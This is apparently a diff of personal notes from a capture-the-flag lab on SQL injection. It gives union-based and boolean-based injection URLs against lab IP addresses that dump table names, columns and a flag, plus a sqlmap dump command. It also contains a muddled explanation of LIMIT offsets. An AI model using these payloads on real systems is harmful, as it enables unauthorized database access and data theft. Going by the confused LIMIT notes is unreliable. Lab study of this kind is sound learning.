@@ -28,20 +28,21 @@ http://10.10.211.148/post?id=2 and 1=2 union select 1,2,table_name,4 from inform
 http://10.10.231.6/post?id=2 and 1=2 union select 1,2,column_name,4 from information_schema.columns where table_name= 'flag' limit 0,1-- -
 http://10.10.231.6/post?id=2 and 1=2 union select 1,2,column_name,4 from information_schema.columns where table_name= 'flag' limit 1,1-- -
 
-limit 0,1 and 1,1 means the first 0,1 refers to data(column_name) and the second 1 refers to row
+limit 0,1 = 0 = first column, 1= row
+limit 1,1 = 1 = second column, 1= row
 
-http://10.10.231.6/post?id=2 and 1=2 union select 1,2,concat(id,flag),4 from sqhell_5.flag limit 0,1-- -
+http://10.10.231.6/post?id=2 and 1=2 union select 1,2,concat(id,flag),4 from sqhell_5.flag   (flag is table_name)
 
-concat(id,flag) means concatinate the id and flag data together, example id=THM and flag={FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} 
+concat(id,flag) means concatinate the id and flag(column_name) data together, example id=THM and flag={FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} 
 Final=THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} 
 
 BOOLEAN BASED SQL INJECTION
 ----------------------------
-http://10.10.231.6/register/user-check?username=admin' (admin user is valid so it will return true value)
+http://10.10.134.64/register/user-check?username=admin' (admin user is valid so it will return true value)
 
-http://10.10.231.6/register/user-check?username=admin' union select 1,2 from flag where flag='T%25 (there is no flag in column 1 and 2 so, admin value will return true)
+http://10.10.231.6/register/user-check?username=admin' union select 1,2 from flag where flag like 'T%25 (T mans THM , there is no flag in column 1 and 2 so, admin value will return true)
 
-http://10.10.231.6/register/user-check?username=admin' union select 1,2,3 from flag where flag='T%25 (there is flag in column 3 so, the admin value will return false)
+http://10.10.231.6/register/user-check?username=admin' union select 1,2,3 from flag where flag like'T%25 (there is flag in column 3 so, the admin value will return false)
 
 Use sqlmap to extract the flag
 #sqlmap -u "http://10.10.231.6/register/user-check?username=admin" -dump
